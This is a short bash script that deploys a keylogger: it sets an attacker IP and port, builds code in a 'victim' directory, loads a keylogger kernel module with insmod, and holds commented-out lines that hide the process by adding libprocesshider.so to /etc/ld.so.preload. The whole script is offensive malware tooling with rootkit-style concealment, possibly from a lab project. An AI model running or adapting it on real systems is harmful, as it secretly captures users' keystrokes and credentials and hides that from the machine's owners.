#!/bin/bash

ATTACKER_IP="192.168.99.10"
ATTACKER_PORT=8080

cd /home/badguy/victim

make

sudo insmod keylogger.ko

echo "[+] badclient is running"

#sudo cp libprocesshider.so /usr/local/lib/

#sudo sh -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'

echo "[+] badclient is hidden"